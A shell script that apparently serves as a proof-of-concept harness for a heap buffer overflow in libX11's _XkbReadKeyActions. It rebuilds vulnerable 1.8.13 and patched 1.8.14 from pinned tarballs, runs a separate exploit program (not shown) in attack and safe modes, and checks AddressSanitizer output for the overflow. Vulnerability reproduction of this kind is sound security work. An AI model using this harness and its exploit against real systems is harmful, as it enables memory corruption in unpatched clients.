#!/bin/sh
# libx11xkb2shell — rebuild libX11 1.8.13 (vulnerable) and 1.8.14 (patched)
# from pinned x.org tarballs, expose the sink with a linkage-only patch, and
# drive real _XkbReadKeyActions() with a crafted XkbGetMapReply. Entirely
# in-process; no X server, socket or external target is contacted.
set -u
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SRC=$ROOT/src
BUILD=$ROOT/build
EV=$ROOT/evidence
mkdir -p "$SRC" "$BUILD" "$EV"

for tag in 1.8.13 1.8.14; do
  if [ ! -f "$SRC/libX11-$tag.tar.xz" ]; then
    curl -fsSL --max-time 120 -o "$SRC/libX11-$tag.tar.xz" \
      "https://www.x.org/archive/individual/lib/libX11-$tag.tar.xz" || exit 1
  fi
done

check() {
  expected=$1; file=$2
  actual=$(sha256sum "$file" | cut -d' ' -f1)
  if [ "$actual" != "$expected" ]; then
    echo "PIN_FAIL $file expected=$expected actual=$actual"; exit 1
  fi
}

check 69606f485c2c07c14ef64f75b7bb326d48587af33795d9ab3e607c0b5f94f11c "$SRC/libX11-1.8.13.tar.xz"
check bbc78c46217174655c2b32b138ad119f3ac15f50808b4d0b3a2677a4b1afc950 "$SRC/libX11-1.8.14.tar.xz"
check dd9ecf20d2ca40c7ec3d8cdf3727c729f9fae3b6cc010e9436f152ae7cd6da31 "$SRC/fix-6d4432b13.patch"
check bdd621bf41ad6408d90440d507ab6d157746471905cf7ac1fc688bd4e10a4e18 "$ROOT/expose.patch"
check 6fb103171874e308a5da4609f566bc087e9f4dbff40ad85d03e3482cb859ad7d "$ROOT/poc.c"

# Confirm the fix hunk is present only in 1.8.14 and the sink exists in both.
grep -q 'rep->firstKeyAct + rep->nKeyActs' "$SRC/fix-6d4432b13.patch" || exit 1

build_one() {
  tag=$1; flavor=$2
  dir=$BUILD/$tag-$flavor
  rm -rf "$dir"
  (cd "$BUILD" && tar xf "$SRC/libX11-$tag.tar.xz") || return 1
  mv "$BUILD/libX11-$tag" "$dir" || return 1
  (cd "$dir" && patch -s -p1 < "$ROOT/expose.patch") || return 1
  case "$flavor" in
    gcc-asan)   cc=gcc;   san='-fsanitize=address -fno-omit-frame-pointer' ;;
    clang-asan) cc=clang; san='-fsanitize=address -fno-omit-frame-pointer' ;;
    gcc-plain)  cc=gcc;   san='' ;;
  esac
  (cd "$dir" && CC=$cc CFLAGS="-g -O0 $san" LDFLAGS="$san" \
     ./configure --disable-shared --enable-static \
       --prefix="$dir/inst" > "$EV/configure-$tag-$flavor.log" 2>&1 &&
     make -j4 > "$EV/build-$tag-$flavor.log" 2>&1) || return 1
  inc="-I$dir -I$dir/include -I$dir/src -I$dir/src/xkb"
  # shellcheck disable=SC2086
  $cc -g -O0 $san $inc -DHAVE_CONFIG_H "$ROOT/poc.c" \
    "$dir/src/.libs/libX11.a" -lxcb -lXau -lXdmcp -lm -lpthread \
    -o "$BUILD/poc-$tag-$flavor" || return 1
}

for tag in 1.8.13 1.8.14; do
  for flavor in gcc-asan clang-asan gcc-plain; do
    build_one "$tag" "$flavor" || { echo "BUILD_FAIL $tag $flavor"; exit 1; }
  done
done

PASS=0; FAIL=0
report() {
  if [ "$1" = ok ]; then
    PASS=$((PASS + 1)); echo "PASS $2"
  else
    FAIL=$((FAIL + 1)); echo "FAIL $2: $3"
  fi
}

for tag in 1.8.13 1.8.14; do
  for flavor in gcc-asan clang-asan gcc-plain; do
    for mode in attack safe; do
      name="$tag-$flavor-$mode"
      f="$EV/$name.out"
      ASAN_OPTIONS=detect_leaks=0 "$BUILD/poc-$tag-$flavor" "$mode" > "$f" 2>&1
      rc=$?
      asan=no
      grep -q 'ERROR: AddressSanitizer' "$f" && asan=yes
      case "$tag-$flavor-$mode" in
        1.8.13-*-asan-attack)
          if [ "$rc" -ne 0 ] && [ "$asan" = yes ] &&
             grep -q 'heap-buffer-overflow' "$f" &&
             grep -q 'WRITE of size 2' "$f" &&
             grep -q '_XkbReadKeyActions' "$f" &&
             grep -q '18-byte region' "$f"; then
            report ok "$name"
          else
            report bad "$name" "rc=$rc asan=$asan expected WRITE-2 at _XkbReadKeyActions"
          fi
          ;;
        1.8.13-*-plain-attack|1.8.13-*-*-safe)
          if [ "$rc" -eq 0 ] && [ "$asan" = no ] && grep -q 'MODE=' "$f"; then
            report ok "$name"
          else
            report bad "$name" "rc=$rc asan=$asan"
          fi
          ;;
        1.8.14-*-attack)
          if [ "$rc" -eq 0 ] && [ "$asan" = no ] &&
             grep -q 'status=1' "$f"; then
            report ok "$name"
          else
            report bad "$name" "rc=$rc asan=$asan expected BadLength"
          fi
          ;;
        1.8.14-*-safe)
          if [ "$rc" -eq 0 ] && [ "$asan" = no ] &&
             grep -q 'status=0' "$f"; then
            report ok "$name"
          else
            report bad "$name" "rc=$rc asan=$asan expected Success"
          fi
          ;;
      esac
    done
  done
done
echo "RESULT PASS=$PASS FAIL=$FAIL"
[ "$FAIL" = 0 ]
